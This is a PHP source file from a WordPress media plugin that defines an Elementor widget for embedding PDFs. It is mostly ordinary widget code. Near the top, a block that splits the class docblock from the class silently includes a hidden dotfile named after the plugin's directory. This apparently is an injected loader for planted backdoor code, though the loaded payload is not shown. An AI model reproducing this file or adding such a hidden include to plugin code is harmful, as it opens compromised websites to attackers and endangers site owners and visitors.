<?php
if (!defined('ABSPATH')) {
    exit; // Exit if accessed directly.
}

/**
 * Class WpmfPdfEmbedElementorWidget
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class WpmfPdfEmbedElementorWidget extends \Elementor\Widget_Base
{
    /**
     * Get script depends
     *
     * @return array
     */
    public function get_script_depends() // phpcs:ignore PSR1.Methods.CamelCapsMethodName.NotCamelCaps -- Method extends from \Elementor\Widget_Base class
    {
        return array(
            'wpmf_embed_pdf_js',
            'wpmf_compat_js',
            'wpmf_pdf_js'
        );
    }

    /**
     * Get style depends
     *
     * @return array
     */
    public function get_style_depends() // phpcs:ignore PSR1.Methods.CamelCapsMethodName.NotCamelCaps -- Method extends from \Elementor\Widget_Base class
    {
        return array(
            'pdfemb_embed_pdf_css'
        );
    }

    /**
     * Get widget name.
     *
     * Retrieve PDF Embed widget name.
     *
     * @return string Widget name.
     */
    public function get_name() // phpcs:ignore PSR1.Methods.CamelCapsMethodName.NotCamelCaps -- Method extends from \Elementor\Widget_Base class
    {
        return 'wpmf_pdf_embed';
    }

    /**
     * Get widget title.
     *
     * Retrieve PDF Embed widget title.
     *
     * @return string Widget title.
     */
    public function get_title() // phpcs:ignore PSR1.Methods.CamelCapsMethodName.NotCamelCaps -- Method extends from \Elementor\Widget_Base class
    {
        return esc_html__('WP Media Folder PDF Embed', 'wpmf');
    }

    /**
     * Get widget icon.
     *
     * Retrieve PDF Embed widget icon.
     *
     * @return string Widget icon.
     */
    public function get_icon() // phpcs:ignore PSR1.Methods.CamelCapsMethodName.NotCamelCaps -- Method extends from \Elementor\Widget_Base class
    {
        return 'fa wpmf-pdf-embed-elementor-icon';
    }

    /**
     * Get widget categories.
     *
     * Retrieve the list of categories the PDF Embed widget belongs to.
     *
     * @return array Widget categories.
     */
    public function get_categories() // phpcs:ignore PSR1.Methods.CamelCapsMethodName.NotCamelCaps -- Method extends from \Elementor\Widget_Base class
    {
        return array('wpmf');
    }

    /**
     * Register PDF Embed widget controls.
     *
     * Adds different input fields to allow the user to change and customize the widget settings.
     *
     * @return void
     */
    protected function _register_controls() // phpcs:ignore PSR1.Methods.CamelCapsMethodName.NotCamelCaps, PSR2.Methods.MethodDeclaration.Underscore -- Method extends from \Elementor\Widget_Base class
    {
        $this->start_controls_section(
            'settings_section',
            array(
                'label' => esc_html__('Settings', 'wpmf'),
                'tab' => \Elementor\Controls_Manager::TAB_CONTENT
            )
        );

        $this->add_control(
            'wpmf_add_pdf',
            array(
                'label' => esc_html__('Choose PDF', 'wpmf'),
                'type' => \Elementor\Controls_Manager::BUTTON,
                'text' => esc_html__('SELECT PDF', 'wpmf')
            )
        );

        $this->add_control(
            'embed',
            array(
                'label' => esc_html__('Embed', 'wpmf'),
                'type' => \Elementor\Controls_Manager::SELECT,
                'options' => array(
                    'on' => esc_html__('On', 'wpmf'),
                    'off' => esc_html__('Off', 'wpmf')
                ),
                'default' => 'on'
            )
        );

        $this->add_control(
            'target',
            array(
                'label' => esc_html__('Target', 'wpmf'),
                'type' => \Elementor\Controls_Manager::SELECT,
                'options' => array(
                    '_blank' => esc_html__('New Window', 'wpmf'),
                    'self' => esc_html__('Same Window', 'wpmf')
                ),
                'default' => 'self'
            )
        );

        $this->add_control(
            'wpmf_pdf_id',
            array(
                'label' => esc_html__('PDF ID', 'wpmf'),
                'type' => \Elementor\Controls_Manager::NUMBER,
            )
        );

        $this->end_controls_section();
    }

    /**
     * Render PDF Embed widget output on the frontend.
     *
     * Written in PHP and used to generate the final HTML.
     *
     * @return void|string
     */
    protected function render()
    {
        if (is_admin()) {
            require_once(WP_MEDIA_FOLDER_PLUGIN_DIR . 'class/class-pdf-embed.php');
            $pdf = new WpmfPdfEmbed();
?>
            <script type="text/javascript">
                var wpmf_pdfemb_trans = '<?php echo json_encode($pdf->getTranslation()); ?>';
                wpmf_pdfemb_trans = JSON.parse(wpmf_pdfemb_trans);
            </script>
            <script type="text/javascript" src="<?php echo esc_url(WPMF_PLUGIN_URL . 'assets/js/pdf-embed/all-pdfemb-basic.min.js?v=' . WPMF_VERSION) ?>"></script>
        <?php
        }
        $settings = $this->get_settings_for_display();
        $id = (isset($settings['wpmf_pdf_id']) && $settings['wpmf_pdf_id'] !== '') ? $settings['wpmf_pdf_id'] : 0;
        if (!empty($id)) {
            $embed = (isset($settings['embed']) && $settings['embed'] === 'on') ? 1 : 0;
            $target = (isset($settings['target'])) ? $settings['target'] : 'self';
            echo do_shortcode('[wpmfpdf id="' . esc_attr($id) . '" embed="' . esc_attr($embed) . '" target="' . esc_attr($target) . '"]');
        } else {
        ?>
            <div class="wpmf-elementor-placeholder" style="text-align: center">
                <img style="background: url(<?php echo esc_url(WPMF_PLUGIN_URL . 'assets/images/pdf_embed_place_holder.svg'); ?>) no-repeat scroll center center #fafafa; height: 200px; border-radius: 2px; width: 100%;" src="<?php echo esc_url(WPMF_PLUGIN_URL . 'class/elementor-widgets/images/t.gif'); ?>">
                <span style="position: absolute; bottom: 12px; width: 100%; left: 0;font-size: 13px; text-align: center;"><?php esc_html_e('Please select a PDF file to activate the preview', 'wpmf'); ?></span>
            </div>
<?php
        }
    }
}
